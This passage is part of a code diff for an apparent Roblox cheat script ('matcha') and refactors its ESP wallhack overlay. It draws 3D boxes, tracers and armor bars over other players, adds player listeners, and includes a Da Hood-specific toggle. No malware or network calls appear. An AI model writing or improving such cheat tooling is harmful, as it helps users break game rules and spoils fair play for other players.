+                esp_obj.quads3d[4].PointB = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[5])).X, (Camera:WorldToViewportPoint(cubeVertices[5])).Y)
+                esp_obj.quads3d[4].PointC = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[7])).X, (Camera:WorldToViewportPoint(cubeVertices[7])).Y)
+                esp_obj.quads3d[4].PointD = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[3])).X, (Camera:WorldToViewportPoint(cubeVertices[3])).Y)
+                esp_obj.quads3d[4].Color = color
+                esp_obj.quads3d[4].Transparency = quad_trans
+                esp_obj.quads3d[4].Visible = true
+
+                esp_obj.quads3d[5].PointA = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[5])).X, (Camera:WorldToViewportPoint(cubeVertices[5])).Y)
+                esp_obj.quads3d[5].PointB = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[7])).X, (Camera:WorldToViewportPoint(cubeVertices[7])).Y)
+                esp_obj.quads3d[5].PointC = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[8])).X, (Camera:WorldToViewportPoint(cubeVertices[8])).Y)
+                esp_obj.quads3d[5].PointD = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[6])).X, (Camera:WorldToViewportPoint(cubeVertices[6])).Y)
+                esp_obj.quads3d[5].Color = color
+                esp_obj.quads3d[5].Transparency = quad_trans
+                esp_obj.quads3d[5].Visible = true
 
                 -- Top face
-                local l9 = DrawLine(cubeVertices[3], cubeVertices[4], getgenv().matcha.ESPBoxesColor, 1, transparency, true)
-                local l10 = DrawLine(cubeVertices[4], cubeVertices[8], getgenv().matcha.ESPBoxesColor, 1, transparency, true)
-                local l11 = DrawLine(cubeVertices[8], cubeVertices[7], getgenv().matcha.ESPBoxesColor, 1, transparency, true)
-                local l12 = DrawLine(cubeVertices[7], cubeVertices[3], getgenv().matcha.ESPBoxesColor, 1, transparency, true)
-                local q6 = DrawQuad(cubeVertices[3], cubeVertices[4], cubeVertices[8], cubeVertices[7], getgenv().matcha.ESPBoxesColor, 1, transparency, true, true)
-                table.insert(esp_obj.lines3d, l9)
-                table.insert(esp_obj.lines3d, l10)
-                table.insert(esp_obj.lines3d, l11)
-                table.insert(esp_obj.lines3d, l12)
-                table.insert(esp_obj.quads3d, q6)
+                esp_obj.lines3d[9].From = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[3])).X, (Camera:WorldToViewportPoint(cubeVertices[3])).Y)
+                esp_obj.lines3d[9].To = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[4])).X, (Camera:WorldToViewportPoint(cubeVertices[4])).Y)
+                esp_obj.lines3d[9].Color = color
+                esp_obj.lines3d[9].Transparency = line_trans
+                esp_obj.lines3d[9].Visible = true
+
+                esp_obj.lines3d[10].From = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[4])).X, (Camera:WorldToViewportPoint(cubeVertices[4])).Y)
+                esp_obj.lines3d[10].To = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[8])).X, (Camera:WorldToViewportPoint(cubeVertices[8])).Y)
+                esp_obj.lines3d[10].Color = color
+                esp_obj.lines3d[10].Transparency = line_trans
+                esp_obj.lines3d[10].Visible = true
+
+                esp_obj.lines3d[11].From = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[8])).X, (Camera:WorldToViewportPoint(cubeVertices[8])).Y)
+                esp_obj.lines3d[11].To = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[7])).X, (Camera:WorldToViewportPoint(cubeVertices[7])).Y)
+                esp_obj.lines3d[11].Color = color
+                esp_obj.lines3d[11].Transparency = line_trans
+                esp_obj.lines3d[11].Visible = true
+
+                esp_obj.lines3d[12].From = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[7])).X, (Camera:WorldToViewportPoint(cubeVertices[7])).Y)
+                esp_obj.lines3d[12].To = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[3])).X, (Camera:WorldToViewportPoint(cubeVertices[3])).Y)
+                esp_obj.lines3d[12].Color = color
+                esp_obj.lines3d[12].Transparency = line_trans
+                esp_obj.lines3d[12].Visible = true
+
+                esp_obj.quads3d[6].PointA = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[3])).X, (Camera:WorldToViewportPoint(cubeVertices[3])).Y)
+                esp_obj.quads3d[6].PointB = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[4])).X, (Camera:WorldToViewportPoint(cubeVertices[4])).Y)
+                esp_obj.quads3d[6].PointC = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[8])).X, (Camera:WorldToViewportPoint(cubeVertices[8])).Y)
+                esp_obj.quads3d[6].PointD = Vector2.new((Camera:WorldToViewportPoint(cubeVertices[7])).X, (Camera:WorldToViewportPoint(cubeVertices[7])).Y)
+                esp_obj.quads3d[6].Color = color
+                esp_obj.quads3d[6].Transparency = quad_trans
+                esp_obj.quads3d[6].Visible = true
             elseif getgenv().matcha.ESPBoxMode == "Corner" then
                 -- Cleanup 3D
-                for _, l in ipairs(esp_obj.lines3d) do l:Remove() end
-                esp_obj.lines3d = {}
-                for _, q in ipairs(esp_obj.quads3d) do q:Remove() end
-                esp_obj.quads3d = {}
+                for _, l in ipairs(esp_obj.lines3d) do l.Visible = false end
+                for _, q in ipairs(esp_obj.quads3d) do q.Visible = false end
 
                 -- Vẽ corner
                 esp_obj.box_outline.Visible = false
@@ -2908,10 +3098,8 @@ RunService.Heartbeat:Connect(function(dt)
                 end
             else  -- 2D normal
                 -- Cleanup 3D and corner
-                for _, l in ipairs(esp_obj.lines3d) do l:Remove() end
-                esp_obj.lines3d = {}
-                for _, q in ipairs(esp_obj.quads3d) do q:Remove() end
-                esp_obj.quads3d = {}
+                for _, l in ipairs(esp_obj.lines3d) do l.Visible = false end
+                for _, q in ipairs(esp_obj.quads3d) do q.Visible = false end
                 for _, l in ipairs(esp_obj.corner_fill) do l.Visible = false end
                 for _, l in ipairs(esp_obj.corner_outline) do l.Visible = false end
 
@@ -2933,10 +3121,8 @@ RunService.Heartbeat:Connect(function(dt)
             esp_obj.box_inline.Visible = false
             for _, l in ipairs(esp_obj.corner_fill) do l.Visible = false end
             for _, l in ipairs(esp_obj.corner_outline) do l.Visible = false end
-            for _, l in ipairs(esp_obj.lines3d) do l:Remove() end
-            esp_obj.lines3d = {}
-            for _, q in ipairs(esp_obj.quads3d) do q:Remove() end
-            esp_obj.quads3d = {}
+            for _, l in ipairs(esp_obj.lines3d) do l.Visible = false end
+            for _, q in ipairs(esp_obj.quads3d) do q.Visible = false end
         end
 
         -- Box Fill (áp dụng cho 2D and corner, for 3D use quads)
@@ -3096,12 +3282,6 @@ RunService.Heartbeat:Connect(function(dt)
             elseif getgenv().matcha.ESPTracerType == 'Top Screen' then
                 from_pos = Vector2.new(Camera.ViewportSize.X / 2, 0)
             end
-            esp_obj.tracer.From = from_pos
-            esp_obj.tracer.To = Vector2.new(screen_pos.X, screen_pos.Y)
-            esp_obj.tracer.Color = getgenv().matcha.ESPTracerColor
-            esp_obj.tracer.Thickness = getgenv().matcha.ESPTracerThickness
-            esp_obj.tracer.Transparency = transparency
-            esp_obj.tracer.Visible = true
 
             esp_obj.tracer_outline.From = from_pos
             esp_obj.tracer_outline.To = Vector2.new(screen_pos.X, screen_pos.Y)
@@ -3109,9 +3289,16 @@ RunService.Heartbeat:Connect(function(dt)
             esp_obj.tracer_outline.Thickness = getgenv().matcha.ESPTracerThickness + 2
             esp_obj.tracer_outline.Transparency = transparency
             esp_obj.tracer_outline.Visible = true
+
+            esp_obj.tracer.From = from_pos
+            esp_obj.tracer.To = Vector2.new(screen_pos.X, screen_pos.Y)
+            esp_obj.tracer.Color = getgenv().matcha.ESPTracerColor
+            esp_obj.tracer.Thickness = getgenv().matcha.ESPTracerThickness
+            esp_obj.tracer.Transparency = transparency
+            esp_obj.tracer.Visible = true
         else
-            esp_obj.tracer.Visible = false
             esp_obj.tracer_outline.Visible = false
+            esp_obj.tracer.Visible = false
         end
 
         -- Armor Bar
@@ -3119,7 +3306,7 @@ RunService.Heartbeat:Connect(function(dt)
             local bodyEffects = char:FindFirstChild("BodyEffects")
             local armor = bodyEffects and bodyEffects:FindFirstChild("Armor")
             if armor then
-                local armor_percentage = armor.Value / 100  -- Giả sử max 100
+                local armor_percentage = armor.Value / 100  
                 local armor_bar_height = armor_percentage * box_size.Y
 
                 esp_obj.armor_bar_outline.From = Vector2.new(box_position.X + box_size.X + 5, box_position.Y + box_size.Y)
@@ -3149,8 +3336,29 @@ RunService.Heartbeat:Connect(function(dt)
     applySelfChams()
 end)
 
--- 🌿 Nút UI (thêm vào groupbox ESP và ESP2)
--- Trong ESPGroup:
+-- Listener cho player added/removed để manage ESP
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function(char)
+        if getgenv().matcha.ESPEnabled then
+            esp_add_player(player)
+        end
+    end)
+end)
+
+Players.PlayerRemoving:Connect(function(player)
+    esp_remove_player(player)
+end)
+
+-- Cho LocalPlayer (init)
+if LocalPlayer.Character then
+    esp_add_player(LocalPlayer)
+end
+LocalPlayer.CharacterAdded:Connect(function(char)
+    if getgenv().matcha.ESPEnabled then
+        esp_add_player(LocalPlayer)
+    end
+end)
+
 if isDaHood() then
     ESPGroup:AddToggle('ESPArmorBar', {
         Text = 'Armor Bar',
@@ -3166,6 +3374,7 @@ if isDaHood() then
         end
     })
 end
+
 
 -- Trong ESP2Group:
 ESP2Group:AddToggle('ESPArrow', {
